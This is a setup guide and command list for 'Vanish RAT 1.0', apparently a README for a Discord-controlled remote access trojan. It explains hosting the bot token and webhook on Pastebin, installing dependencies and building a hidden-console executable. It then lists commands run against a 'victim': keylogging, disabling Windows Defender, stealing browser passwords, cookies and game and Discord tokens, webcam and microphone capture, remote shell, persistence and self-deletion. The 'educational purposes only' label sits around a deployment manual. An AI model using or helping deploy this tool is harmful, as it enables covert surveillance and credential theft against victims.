
![discord](https://github.com/user-attachments/assets/341b5144-9c33-40ec-b229-c4ce3ad8a600)

           For educational purposes only!!
             Discord Rat - Setup Guide
--------------------------------------------------------
Author  : @deadconvicess | Packaged By: #deadconvicess
License : MIT
--------------------------------------------------------

 WHAT YOU NEED
----------------
1. Python 3.11+ Installed
2. A Discord Bot Token (https://discord.com/developers/applications)
3. A Discord Webhook URL (Discord Channel > Integrations > Webhooks)
4. Pastebin or Gist account for hosting config


 SETUP INSTRUCTIONS
---------------------
1. Create a Pastebin/Gist with:
   Line 1: Your Discord Bot Token
   Line 2: Your Discord Webhook URL

2. Make sure it's RAW viewable (Unlisted or Public)

3. Copy the RAW link and paste it into Rat.py:
   Example:
   config_url = "https://pastebin.com/raw/YourPasteID"

4. Install the required packages:
   pip install -r requirements.txt
   OR manually install:
   pip install discord requests pypiwin32 pycaw comtypes opencv-python numpy sounddevice scipy pyautogui pynput cryptography pycryptodome pillow aiofiles pyttsx3

5. Run the bot:
   python Rat.pyw


 OPTIONAL: BUILDING EXE
---------------------------------
For No Console Window:
- Nuitka: pip install nuitka
  nuitka --onefile --windows-disable-console Rat.py

- OR PyInstaller: pip install pyinstaller
  pyinstaller --onefile --noconsole Rat.py


DISCORD COMMAND PANEL
---------------------------
Once bot is running, type:
   .help
To view available commands.

Vanish Commands:
.info           – System info From Victim
.geo            – IP & Geo From Victim
.admin          - Ask For Admin
.key start/stop – Start or stop keylogger
.dwd            – Disable Windows Defender
.rtp            – Disable Real Time Protection
.kill           – Kill "process" 
.disablemgr     - Disables Task Manager
.enablemgr      – Enables Task Manager
.openurl <link> – Open Link in browser
.up             – Upload a file To Victims Pc 
.df             – Delete Uploaded File
.qr             – Connects to wifi via qr
.record         – Screen record Victims Pc 
.ss             – Screenshot Victims Pc
.webcam         – Take webcam photo
.sf (File Name) - File Stealer         - 
.af             - Steals Auto Fill
.pw             – Browser Passwords
.gc             – Grab Browser Cookies
.net            – Netflix Info Grabber
.epic           - Epic Games Grabber
.steam          – Steam Grabber
.riot           – Riot Grabber
.token          – Discord token grabber
.reg            – Add to Startup(Registry)
.rmreg          – Remove from Startup(Registry)
.wifi           - Wifi Info Grabber
.cb             - Clipboard Grabber
.sp             – Spotify token grabber
.v <0–100>      - Set system volume
.shell <cmd>    – Run Cmd/Shell Commands
.list           – Running processes From Victim
.history        – Browser history From Victim
.Mic            – Record Victims microphone
.speak "msg"    - Uses TTS To Say Custom Msgs
.msg "msg"      – Message Victim Via Msg Box
.stup           – Add to startup (Task)
.clearstup      – Remove from startup (Task)
.dl             – Grab download history
.wp             – Set wallpaper To Victims Pc
.gwp            – Grab Victims Wallpaper
.moff           – Turn off monitor
.mon            – Turn on monitor
.shutdown       – Shutdown PC
.crash          – Crash Victims Pc 
.restart        – Restart PC
.sd             – Self Delete Incase Of Emergency
.troll          – Open troll Commands
.exit           – Kill Rat


 TROUBLESHOOTING
-------------------
- Check bot token and webhook are valid and accessible
- Ensure all packages are installed
- Make sure you used a RAW Pastebin/Gist link


ENJOY USING VANISH RAT 1.0 

 For educational purposes only!!
--------------------------------------------------------

